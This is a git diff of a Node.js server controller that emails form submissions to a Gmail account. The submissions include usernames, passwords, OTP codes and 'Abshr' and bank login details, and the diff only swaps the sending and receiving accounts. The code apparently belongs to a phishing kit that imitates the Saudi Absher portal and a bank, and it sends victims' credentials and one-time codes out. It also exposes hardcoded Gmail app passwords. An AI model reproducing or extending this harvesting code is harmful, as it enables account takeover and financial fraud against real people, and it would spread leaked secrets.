@@ -71,16 +71,16 @@ exports.email = async(req,res,next)=>{
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-            //   pass: 'bojr nrmj bjen rcgt',
-            pass: 'idot oooz frhy mdsr',
+              user: 'pnusds269@gmail.com',
+              // user: 'saudiabsher1990@gmail.com',
+              pass: 'bojr nrmj bjen rcgt',
+            // pass: 'idot oooz frhy mdsr',
             },
           });
           await transporter.sendMail({
             from:'Admin Panel',
-            to:'saudiabsher1990@gmail.com',
-            // to:'pnusds269@gmail.com',
+            // to:'saudiabsher1990@gmail.com',
+            to:'pnusds269@gmail.com',
             subject: `Abshr Username And Password Account  Login`,
             html:`<div>
             <p> Username : ${req.body.username}</p>
@@ -98,10 +98,10 @@ exports.email = async(req,res,next)=>{
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-                // pass: 'bojr nrmj bjen rcgt',
-              pass: 'idot oooz frhy mdsr',
+              user: 'pnusds269@gmail.com',
+              // user: 'saudiabsher1990@gmail.com',
+                pass: 'bojr nrmj bjen rcgt',
+              // pass: 'idot oooz frhy mdsr',
             },
           });
 // Construct HTML content dynamically from req.body
@@ -114,8 +114,8 @@ htmlContent += '</div>';
 // Send email with dynamically generated HTML content
 await transporter.sendMail({
     from: 'Admin Panel',
-    to: 'saudiabsher1990@gmail.com',
-    // to: 'pnusds269@gmail.com',
+    // to: 'saudiabsher1990@gmail.com',
+    to: 'pnusds269@gmail.com',
     subject: `Abshr Form Register`,
     html: htmlContent
 }).then(info => {
@@ -131,16 +131,16 @@ await transporter.sendMail({
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-            //   pass: 'bojr nrmj bjen rcgt',
-            pass: 'idot oooz frhy mdsr',
+              user: 'pnusds269@gmail.com',
+              // user: 'saudiabsher1990@gmail.com',
+              pass: 'bojr nrmj bjen rcgt',
+            // pass: 'idot oooz frhy mdsr',
             },
           });
           await transporter.sendMail({
             from:'Admin Panel',
-            to:'saudiabsher1990@gmail.com',
-            // to:'pnusds269@gmail.com',
+            // to:'saudiabsher1990@gmail.com',
+            to:'pnusds269@gmail.com',
             subject: `Bank Username And Password Account  Login`,
             html:`<div>
             <p> Username : ${req.body.username}</p>
@@ -158,10 +158,10 @@ await transporter.sendMail({
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-                // pass: 'bojr nrmj bjen rcgt',
-              pass: 'idot oooz frhy mdsr',
+              user: 'pnusds269@gmail.com',
+              // user: 'saudiabsher1990@gmail.com',
+                pass: 'bojr nrmj bjen rcgt',
+              // pass: 'idot oooz frhy mdsr',
             },
           });
 // Construct HTML content dynamically from req.body
@@ -174,8 +174,8 @@ htmlContent += '</div>';
 // Send email with dynamically generated HTML content
 await transporter.sendMail({
     from: 'Admin Panel',
-    to: 'saudiabsher1990@gmail.com',
-    // to: 'pnusds269@gmail.com',
+    // to: 'saudiabsher1990@gmail.com',
+    to: 'pnusds269@gmail.com',
     subject: `Abshr Order`,
     html: htmlContent
 }).then(info => {
@@ -191,10 +191,10 @@ await transporter.sendMail({
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-                // pass: 'bojr nrmj bjen rcgt',
-              pass: 'idot oooz frhy mdsr',
+              user: 'pnusds269@gmail.com',
+              // user: 'saudiabsher1990@gmail.com',
+                pass: 'bojr nrmj bjen rcgt',
+              // pass: 'idot oooz frhy mdsr',
             },
           });
           let htmlContent = '<div>';
@@ -213,8 +213,8 @@ await transporter.sendMail({
 // Send email with dynamically generated HTML content
 await transporter.sendMail({
     from: 'Admin Panel',
-    to: 'saudiabsher1990@gmail.com',
-    // to: 'pnusds269@gmail.com',
+    // to: 'saudiabsher1990@gmail.com',
+    to: 'pnusds269@gmail.com',
     subject: `Abshr Order With Otp`,
     html: htmlContent
 }).then(info => {
@@ -229,16 +229,16 @@ await transporter.sendMail({
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-            //   user: 'pnusds269@gmail.com',
-              user: 'saudiabsher1990@gmail.com',
-              pass: 'idot oooz frhy mdsr',
-            // pass: 'bojr nrmj bjen rcgt',
+              user: 'pnusds269@gmail.com',
+              // user: 'saudiabsher1990@gmail.com',
+              // pass: 'idot oooz frhy mdsr',
+            pass: 'bojr nrmj bjen rcgt',
             },
           });
           await transporter.sendMail({
             from:'Admin Panel',
-            // to:'pnusds269@gmail.com',
-            to: 'saudiabsher1990@gmail.com',
+            to:'pnusds269@gmail.com',
+            // to: 'saudiabsher1990@gmail.com',
             subject: `Last Otp`,
             html:`<div>
             ${req.body.otp ? `<p> Otp : ${req.body.otp}</p> `:'' }      
